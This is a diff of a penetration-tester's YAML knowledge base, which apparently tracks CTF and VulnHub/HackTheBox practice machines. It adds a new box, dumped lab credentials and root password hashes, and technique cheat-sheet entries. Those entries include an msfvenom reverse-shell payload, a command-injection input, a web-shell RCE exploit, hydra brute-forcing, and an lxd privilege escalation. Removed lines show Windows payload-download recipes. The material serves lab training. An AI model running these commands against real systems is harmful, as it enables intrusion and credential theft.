@@ -19,10 +19,10 @@ summary:
     ownedvhoscplike: 19
     ownedvhwindows: 0
     ownedwindows: 12
-    percent: '23.23'
+    percent: '23.87'
     percenthtb: '18.31'
-    percentnix: '4.80'
-    percentvh: '27.38'
+    percentnix: '4.97'
+    percentvh: '28.57'
     percentwindows: '12.73'
     perhtb: 14.035087719298245
     perhtbnix: 20.33898305084746
@@ -48,10 +48,10 @@ summary:
     vhnix: 486
     vhoscplike: 84
     vhwindows: 2
-    writeups: 36
+    writeups: 37
     writeupshtb: 13
-    writeupsnix: 29
-    writeupsvh: 23
+    writeupsnix: 30
+    writeupsvh: 24
     writeupswindows: 7
   loot:
     credentials:
@@ -139,6 +139,12 @@ summary:
     - credtype: mysql
       password: 3298fj8323j80df!49
       username: admin
+    - credtype: mysql
+      password: Oscp12345!
+      username: wordpress
+    - credtype: wordpress
+      password: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2P36Pr1D0
+      username: null
     - credtype: mysql
       password: hiroshima
       username: john
@@ -298,6 +304,7 @@ summary:
     - 'notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl8WBG1:17349:0:99999:7:::'
     - 'noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHSZmg7/:17247:0:99999:7:::'
     - 'Ori:$6$1zYgjEIM$VQ0gvU7JjenS9WuiVjSeva8pbWnEXjqTmEdFnQRXKmTmXPXmt55/oyup40NiXD8J9GxmXF7DYiaHZDRshrs3f1:17237:0:99999:7:::'
+    - 'oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmBFu/Sf.:18452:0:99999:7:::'
     - 'peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbTTmlb0:17721:0:99999:7:::'
     - 'pi:$6$SQPHFoql$gSE5qWbZRGHDin4LnFY56sMnQsmvH/o2oIlXv.3KcqVsJCYgJ09R9/Pws88e8yjKgJnaxN3zdq8f5ots1bJcY/:17148:0:99999:7:::'
     - 'postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::'
@@ -311,6 +318,7 @@ summary:
     - 'root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::'
     - 'root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::'
     - 'root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::'
+    - 'root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEgm9QfT1:18452:0:99999:7:::'
     - 'root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::'
     - 'root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::'
     - 'root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQdPUAH.:17431:0:99999:7:::'
@@ -380,9 +388,9 @@ summary:
   plot:
     categories:
       htb: 13
-      linux: 29
+      linux: 30
       oscp: 35
-      vulnhub: 23
+      vulnhub: 24
       windows: 7
     ports:
       10000/tcp: 1
@@ -396,13 +404,13 @@ summary:
       3000/tcp: 1
       443/tcp: 1
       445/tcp: 1
-      80/tcp: 22
+      80/tcp: 23
       8080/tcp: 2
       9999/tcp: 1
     protocols:
       abyss?: 1
       ftp: 2
-      http: 27
+      http: 28
       microsoft-ds: 1
       ms-sql-s: 1
       netbios-ssn: 4
@@ -423,6 +431,7 @@ summary:
       Apache httpd 2.4.25 ((Debian)): 1
       Apache httpd 2.4.29 ((Ubuntu)): 2
       Apache httpd 2.4.34 ((Ubuntu)): 1
+      Apache httpd 2.4.41 ((Ubuntu)): 1
       Apache httpd 2.4.7 ((Ubuntu)): 3
       HttpFileServer httpd 2.3: 1
       Microsoft IIS httpd 6.0: 2
@@ -444,7 +453,7 @@ summary:
       enumerate_app_powershell_history: 1
       enumerate_app_wordpress: 5
       enumerate_proto_ftp: 1
-      enumerate_proto_http: 2
+      enumerate_proto_http: 3
       enumerate_proto_smb: 1
       enumerate_proto_smb_anonymous_access: 1
       enumerate_proto_sql: 1
@@ -483,6 +492,7 @@ summary:
       exploit_sqli: 4
       exploit_ssh_authorizedkeys: 2
       exploit_ssh_bruteforce: 1
+      exploit_ssh_privatekeys: 1
       exploit_wordpress_defaultcreds: 1
       exploit_wordpress_plugin: 1
       exploit_wordpress_plugin_activitymonitor: 1
@@ -499,6 +509,7 @@ summary:
       privesc_freebsd: 1
       privesc_kernel_ipappend: 1
       privesc_kernel_overlayfs: 1
+      privesc_lxc_bash: 1
       privesc_modssl: 1
       privesc_mysql_creds: 3
       privesc_mysql_root: 2
@@ -1978,6 +1989,62 @@ summary:
     - privesc_bof
     url: https://www.vulnhub.com/entry/imf-1,162/
     writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf
+  - datetime: 20200810
+    infra: VulnHub
+    machine:
+      description: "This box should be easy. This machine was created for the InfoSec\
+        \ Prep Discord Server (https://discord.gg/RRgKaep) as a give way for a 30d\
+        \ voucher to the OSCP Lab, Lab materials, and an exam attempt.\nThe box was\
+        \ created with VMWare Workstation, but it should work with VMWare Player and\
+        \ Virtualbox. Upon booting up it should display an IP address. This is the\
+        \ target address based on whatever settings you have. You should verify the\
+        \ address just incase. \nFind the flag.txt in /root/ and submit it to the\
+        \ TryHarder bot on Discord to enter the give away. The command is only available\
+        \ for so long. So if you are just joining the server or doing the box for\
+        \ fun, the command won't be there any longer at a later time.\nPlease do not\
+        \ publish any write ups for this box until August 7, 2020 as this is probably\
+        \ when the give away will end. After that, fair game!\nA big thanks to Offensive\
+        \ Security for providing the OSCP voucher. \nBox created by FalconSpy with\
+        \ the support of the staff at InfoSec Prep Discord Server"
+      difficulty: null
+      difficulty_ratings: null
+      id: 508
+      infrastructure: vulnhub
+      killchainurl: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png
+      maker:
+        id: 646
+        name: FalconSpy
+        url: https://www.vulnhub.com/author/falconspy,646/
+      matrixurl: null
+      name: 'InfoSec Prep: OSCP'
+      os: Linux
+      oscplike: true
+      owned_root: true
+      owned_user: true
+      points: null
+      private: false
+      ratingsurl: null
+      release: 11 Jul 2020
+      series:
+        id: 336
+        name: InfoSec Prep
+        url: https://www.vulnhub.com/series/infosec-prep,336/
+      shortname: 'infosec prep: oscp'
+      url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+      verbose_id: vulnhub#508
+      writeupmdurl: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.md
+      writeuppdfurl: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
+    name: 'InfoSec Prep: OSCP'
+    overview: <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png"
+      width="100" height="100" />
+    points: 10
+    status: public
+    tags:
+    - enumerate_proto_http
+    - exploit_ssh_privatekeys
+    - privesc_lxc_bash
+    url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+    writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
   - datetime: 20190928
     infra: VulnHub
     machine:
@@ -3144,7 +3211,25 @@ summary:
       \uDC27`](foo \"Linux\")  |                    | [`\uD83E\uDE78`](foo \"access_root\"\
       ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 20. |                       \
       \                                                                          \
-      \     [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf)\
+      \   [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf)\
+      \                                                                          \
+      \                          |        [vh#508](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)\
+      \       |       <img src=\"https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png\"\
+      \ width=\"100\" height=\"100\"/>       |                                   \
+      \                                                                          \
+      \                                                                          \
+      \                                                                          \
+      \   [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http),\
+      \ [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys),\
+      \ [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash)\
+      \                                                                          \
+      \                                                                          \
+      \                                                                          \
+      \                                      |  [`\uD83D\uDC27`](foo \"Linux\")  |\
+      \                    | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F\
+      `](foo \"== oscplike\") |\n| 21. |                                         \
+      \                                                             [Kioptrix: 2014\
+      \ (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf)\
       \                                                                          \
       \                             |          [vh#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)\
       \         |          <img src=\"https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png\"\
@@ -3159,7 +3244,7 @@ summary:
       \                                                                          \
       \                                                      |   [`\uD83D\uDC79`](foo\
       \ \"BSD\")   |                    | [`\uD83E\uDE78`](foo \"access_root\") |\
-      \ [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 21. |                         \
+      \ [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 22. |                         \
       \                                                                          \
       \  [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf)\
       \                                                                          \
@@ -3176,7 +3261,7 @@ summary:
       \                                                                          \
       \                                                                          \
       \            |  [`\uD83D\uDC27`](foo \"Linux\")  |                    | [`\uD83E\
-      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 22.\
+      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 23.\
       \ |                                                                        \
       \                            [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf)\
       \                                                                          \
@@ -3193,7 +3278,7 @@ summary:
       \                                                                          \
       \                                               |  [`\uD83D\uDC27`](foo \"Linux\"\
       )  |                    | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F\
-      `](foo \"== oscplike\") |\n| 23. |                                         \
+      `](foo \"== oscplike\") |\n| 24. |                                         \
       \                                                           [Kioptrix: Level\
       \ 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf)\
       \                                                                          \
@@ -3210,7 +3295,7 @@ summary:
       \                                                                          \
       \                                                      |  [`\uD83D\uDC27`](foo\
       \ \"Linux\")  |                    | [`\uD83E\uDE78`](foo \"access_root\") |\
-      \ [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 24. |                         \
+      \ [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 25. |                         \
       \                                                                          \
       \ [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf)\
       \                                                                          \
@@ -3228,7 +3313,7 @@ summary:
       \                                                                          \
       \                                           |  [`\uD83D\uDC27`](foo \"Linux\"\
       )  |                    | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F\
-      `](foo \"== oscplike\") |\n| 25. |       [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf)<br/><img\
+      `](foo \"== oscplike\") |\n| 26. |       [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf)<br/><img\
       \ src=\"https://github.com/7h3rAm/writeups/blob/master/htb.lame/matrix.png\"\
       \ width=\"59\" height=\"59\"/><br/><img src=\"https://github.com/7h3rAm/writeups/blob/master/htb.lame/ratings.png\"\
       \ width=\"59\" height=\"20\"/>       |          [htb#1](https://www.hackthebox.eu/home/machines/profile/1)\
@@ -3245,7 +3330,7 @@ summary:
       \                                                                          \
       \                                               |  [`\uD83D\uDC27`](foo \"Linux\"\
       )  | [`\uD83D\uDFE2`](foo \"20pts\") | [`\uD83E\uDE78`](foo \"access_root\"\
-      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 26. |                       \
+      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 27. |                       \
       \                                                                          \
       \     [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf)\
       \                                                                          \
@@ -3261,7 +3346,7 @@ summary:
       \ [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo)        \
       \                                                                          \
       \     |  [`\uD83D\uDC27`](foo \"Linux\")  |                    | [`\uD83E\uDE78\
-      `](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 27. | \
+      `](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 28. | \
       \  [Legacy](https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf)<br/><img\
       \ src=\"https://github.com/7h3rAm/writeups/blob/master/htb.legacy/matrix.png\"\
       \ width=\"59\" height=\"59\"/><br/><img src=\"https://github.com/7h3rAm/writeups/blob/master/htb.legacy/ratings.png\"\
@@ -3279,7 +3364,7 @@ summary:
       \                                                                          \
       \                                              | [`\uD83D\uDD37`](foo \"Windows\"\
       ) | [`\uD83D\uDFE2`](foo \"20pts\") | [`\uD83E\uDE78`](foo \"access_root\")\
-      \ | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 28. |                       \
+      \ | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 29. |                       \
       \                                                                          \
       \      [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf)\
       \                                                                          \
@@ -3296,7 +3381,7 @@ summary:
       \                                                                          \
       \                                                                    |  [`\uD83D\
       \uDC27`](foo \"Linux\")  |                    | [`\uD83E\uDE78`](foo \"access_root\"\
-      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 29. |                       \
+      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 30. |                       \
       \                                                                          [Lord\
       \ Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf)\
       \                                                                          \
@@ -3313,7 +3398,7 @@ summary:
       \                                                                          \
       \                                       |  [`\uD83D\uDC27`](foo \"Linux\") \
       \ |                    | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F\
-      `](foo \"== oscplike\") |\n| 30. |     [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf)<br/><img\
+      `](foo \"== oscplike\") |\n| 31. |     [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf)<br/><img\
       \ src=\"https://github.com/7h3rAm/writeups/blob/master/htb.mirai/matrix.png\"\
       \ width=\"59\" height=\"59\"/><br/><img src=\"https://github.com/7h3rAm/writeups/blob/master/htb.mirai/ratings.png\"\
       \ width=\"59\" height=\"20\"/>     |         [htb#64](https://www.hackthebox.eu/home/machines/profile/64)\
@@ -3330,7 +3415,7 @@ summary:
       \                                                                          \
       \       |  [`\uD83D\uDC27`](foo \"Linux\")  | [`\uD83D\uDFE2`](foo \"20pts\"\
       ) | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\"\
-      ) |\n| 31. |                                                               \
+      ) |\n| 32. |                                                               \
       \                                       [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf)\
       \                                                                          \
       \                             |         [vh#371](https://www.vulnhub.com/entry/misdirection-1,371/)\
@@ -3345,7 +3430,7 @@ summary:
       \                                                                          \
       \                                                                  |  [`\uD83D\
       \uDC27`](foo \"Linux\")  |                    | [`\uD83E\uDE78`](foo \"access_root\"\
-      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 32. |                       \
+      ) | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 33. |                       \
       \                                                                          \
       \           [Moria: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf)\
       \                                                                          \
@@ -3363,7 +3448,7 @@ summary:
       \                                                                          \
       \                                            |  [`\uD83D\uDC27`](foo \"Linux\"\
       )  |                    | [`\uD83E\uDE78`](foo \"access_root\") |          \
-      \                 |\n| 33. |                                               \
+      \                 |\n| 34. |                                               \
       \                                                            [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf)\
       \                                                                          \
       \                                 |           [vh#151](https://www.vulnhub.com/entry/mr-robot-1,151/)\
@@ -3379,7 +3464,7 @@ summary:
       \                                                                          \
       \                                               |  [`\uD83D\uDC27`](foo \"Linux\"\
       )  |                    | [`\uD83E\uDE78`](foo \"access_root\") | [`\u26A0\uFE0F\
-      `](foo \"== oscplike\") |\n| 34. |                                         \
+      `](foo \"== oscplike\") |\n| 35. |                                         \
       \                                                                     [Node:\
       \ 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf)\
       \                                                                          \
@@ -3395,7 +3480,7 @@ summary:
       \                                                                          \
       \                                                                          \
       \              |  [`\uD83D\uDC27`](foo \"Linux\")  |                    | [`\uD83E\
-      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 35.\
+      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 36.\
       \ | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf)<br/><img\
       \ src=\"https://github.com/7h3rAm/writeups/blob/master/htb.optimum/matrix.png\"\
       \ width=\"59\" height=\"59\"/><br/><img src=\"https://github.com/7h3rAm/writeups/blob/master/htb.optimum/ratings.png\"\
@@ -3412,7 +3497,7 @@ summary:
       \                                                                          \
       \                                                                          |\
       \ [`\uD83D\uDD37`](foo \"Windows\") | [`\uD83D\uDFE2`](foo \"20pts\") | [`\uD83E\
-      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 36.\
+      \uDE78`](foo \"access_root\") | [`\u26A0\uFE0F`](foo \"== oscplike\") |\n| 37.\
       \ | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf)<br/><img\
       \ src=\"https://github.com/7h3rAm/writeups/blob/master/htb.shocker/matrix.png\"\
       \ width=\"59\" height=\"59\"/><br/><img src=\"https://github.com/7h3rAm/writeups/blob/master/htb.shocker/ratings.png\"\
@@ -3899,6 +3984,15 @@ summary:
           gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt
           -u https://<targetip>:<targetport> -s "200,204,301,307,403,500"
 
+          gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+          -u http://<taregtip>/ -t 20 -U <username> -P <password>
+
+          hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-get
+          /
+
+          hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-head
+          /
+
           nc -v -n -w1 <targetip> <targetport> ## netcat to grab banner
 
           nikto -o "[OUTPUT].txt" -p <targetport> -h <targetip>
@@ -3957,6 +4051,19 @@ summary:
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
+        - datetime: 20200810
+          infra: VulnHub
+          name: 'InfoSec Prep: OSCP'
+          overview: <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png"
+            width="100" height="100" />
+          points: 10
+          status: public
+          tags:
+          - enumerate_proto_http
+          - exploit_ssh_privatekeys
+          - privesc_lxc_bash
+          url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+          writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       enumerate_proto_ldap:
         cli: 'ldapsearch -x -s base -h <targetip> -p 389
 
@@ -4373,6 +4480,20 @@ summary:
           - privesc_sudo
           url: https://www.vulnhub.com/entry/brainpan-1,51/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf
+      exploit_cloudme_bof:
+        cli: 'msfvenom -p windows/shell_reverse_tcp lhost=<attackerip> lport=<attackerport>
+          -b "\x00\x0a\x0d" -f python -a x86 --platform windows -e x86/shikata_ga_nai
+
+          sudo nc -nlvp <attackerport>
+
+          python 48389.py
+
+          '
+        description: the CloudMe version 1.11.12 is vulnerable to a buffer overflow
+          that could be used to gain interactive access on the target system, possibly
+          with elevated privileges
+        references:
+        - https://www.exploit-db.com/exploits/48389
       exploit_cmdexec:
         cli: 'nc -nlvp <attackerport>
 
@@ -4418,6 +4539,14 @@ summary:
           a new scheduled task. this is a post-authentication vulnerability
         references:
         - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+      exploit_command_injection:
+        cli: '# submit escaped input: "\";whoami\n"
+
+          '
+        description: certain webapps couldbe vulebrable to command injection via input
+          text fields
+        references:
+        - https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/
       exploit_credsreuse:
         cli: ''
         description: Reuse credentials already found for a service to interact with
@@ -4576,6 +4705,17 @@ summary:
         references:
         - https://0xrick.github.io/hack-the-box/active/
         - https://adsecurity.org/?p=2288
+      exploit_gymsystem_rce:
+        cli: 'python 48506.py http://<targetip>:<targetport>/
+
+
+          curl "http://<targetip>:<targetport>/upload/kamehameha.php?telepathy=whoami"
+
+          '
+        description: use `/contacts.php` to confirm the version is 1.0 and fire this
+          exploit to get a pseudo-interactive shell on the target machine. you can
+        references:
+        - https://www.exploit-db.com/exploits/48506
       exploit_hfs_cmd_exec:
         cli: 'python 39161.py <targetip> <targetport>
 
@@ -5506,6 +5646,24 @@ summary:
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
+      exploit_ssh_privatekeys:
+        cli: ''
+        description: null
+        references: []
+        writeups:
+        - datetime: 20200810
+          infra: VulnHub
+          name: 'InfoSec Prep: OSCP'
+          overview: <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png"
+            width="100" height="100" />
+          points: 10
+          status: public
+          tags:
+          - enumerate_proto_http
+          - exploit_ssh_privatekeys
+          - privesc_lxc_bash
+          url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+          writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       exploit_ssl_heartbleed:
         cli: 'nmap --script=ssl-heartbleed -p <targetport> <targetip>
 
@@ -5886,6 +6044,15 @@ summary:
           - privesc_docker_group
           url: https://www.vulnhub.com/entry/linsecurity-1,244/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf
+      privesc_env_relative_path:
+        cli: ''
+        description: certain files when referenced without their complete path, can
+          be misused to gain elevated privileges. this can be done by modifying the
+          environment path to find the referenced file within a directory under attacker's
+          control and placing a malicious binary within that directory with the same
+          name as the referenced file
+        references:
+        - https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/
       privesc_freebsd:
         cli: ''
         description: null
@@ -5987,6 +6154,28 @@ summary:
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
+      privesc_lxc_bash:
+        cli: 'check output of id command
+
+          if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+
+          '
+        description: null
+        references: []
+        writeups:
+        - datetime: 20200810
+          infra: VulnHub
+          name: 'InfoSec Prep: OSCP'
+          overview: <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png"
+            width="100" height="100" />
+          points: 10
+          status: public
+          tags:
+          - enumerate_proto_http
+          - exploit_ssh_privatekeys
+          - privesc_lxc_bash
+          url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+          writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       privesc_modssl:
         cli: ''
         description: null
@@ -6770,46 +6959,49 @@ summary:
   - cli: "certutil.exe -urlcache -split -f \"https://download.sysinternals.com/files/PSTools.zip\"\
       \ pstools.zip\npowershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.exe','C:\\\
       Users\\user\\Desktop\\file.exe')\"\npython3 -m pyftpdlib -p 21\nrdesktop <targetip>\
-      \ -r disk:remotedisk=/usr/share/windows-binaries\ngzip+xxd:\nsender:\n  gzip\
-      \ -c < file > file.gz\n  xxd -p file.gz | tr -d '\\n' && echo\nreceiver:\n \
-      \ echo 1f8b...0000 > /tmp/file.gz.hex\n  xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz\n\
-      \  gunzip -c < /tmp/file.gz > /tmp/file\nautomate file download via windows\
-      \ ftp client:\necho open <targetip> >ftp_commands.txt\necho anonymous >>ftp_commands.txt\n\
-      echo whatever >>ftp_commands.txt\necho binary >>ftp_commands.txt\necho get met8888.exe\
-      \ >>ftp_commands.txt\necho bye >>ftp_commands.txt\nftp -s:ftp_commands.txt\n\
-      create wget.vbs and download netcat:\n>C:\\Windows\\d.vbs\necho strUrl = WScript.Arguments.Item(0)\
-      \  >>C:\\Windows\\d.vbs\necho StrFile = WScript.Arguments.Item(1)  >>C:\\Windows\\\
-      d.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\\Windows\\d.vbs\n\
-      echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\\Windows\\d.vbs\necho\
-      \ Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\\Windows\\d.vbs\necho Const\
-      \ HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\\Windows\\d.vbs\necho Dim http, varByteArray,\
-      \ strData, strBuffer, lngCounter, fs, ts  >>C:\\Windows\\d.vbs\necho Err.Clear\
-      \  >>C:\\Windows\\d.vbs\necho Set http = Nothing  >>C:\\Windows\\d.vbs\necho\
-      \ Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\")  >>C:\\Windows\\d.vbs\n\
-      echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\"\
-      )   >>C:\\Windows\\d.vbs\necho If http Is Nothing Then Set http = CreateObject(\"\
-      MSXML2.ServerXMLHTTP\")   >>C:\\Windows\\d.vbs\necho If http Is Nothing Then\
-      \ Set http = CreateObject(\"Microsoft.XMLHTTP\")  >>C:\\Windows\\d.vbs\necho\
-      \ http.Open \"GET\", strURL, False  >>C:\\Windows\\d.vbs\necho http.Send  >>C:\\\
-      Windows\\d.vbs\necho varByteArray = http.ResponseBody  >>C:\\Windows\\d.vbs\n\
-      echo Set http = Nothing  >>C:\\Windows\\d.vbs\necho Set fs = CreateObject(\"\
-      Scripting.FileSystemObject\")  >>C:\\Windows\\d.vbs\necho Set ts = fs.CreateTextFile(StrFile,\
-      \ True)  >>C:\\Windows\\d.vbs\necho strData = \"\"  >>C:\\Windows\\d.vbs\necho\
-      \ strBuffer = \"\"  >>C:\\Windows\\d.vbs\necho For lngCounter = 0 to UBound(varByteArray)\
-      \  >>C:\\Windows\\d.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter\
-      \ + 1, 1)))  >>C:\\Windows\\d.vbs\necho Next  >>C:\\Windows\\d.vbs\necho ts.Close\
-      \ >>C:\\Windows\\d.vbs\ndir C:\\Windows\\d.vbs\nC:\\Windows\\d.vbs \"http://<targetip>/nc.exe\"\
-      \ C:\\Windows\\nc.exe\nnetcat:\nnc -w3 <targetip> 1234 <file.sent\ncmd /c nc.exe\
-      \ -l -v -p 1234 >file.rcvd\nsmb (139/tcp, 445/tcp):\nserver: python smbserver.py\
-      \ -smb2support shared $HOME/toolbox/scripts/shared\n  copy ntlm/lm hashes submitted\
-      \ by windows clients during transfers and crack via jtr/hashcat\nclient:\n \
-      \ list files: smbclient -L <targetip> --no-pass\n  list files: net view \\\\\
-      <targetip>\n  list files: dir \\\\<targetip>\\shared\n  copy files: copy \\\\\
-      <targetip>\\shared\\met8888.exe\n  execute files: \\\\<targetip>\\shared\\met8888.exe\n\
-      tftp (69/udp):\nserver:\n  atftpd --daemon --port 69 $HOME/toolbox/scripts/shared\n\
-      \  metasploit:\n    use auxiliary/server/tftp\n    set TFTPROOT $HOME/toolbox/scripts/shared\n\
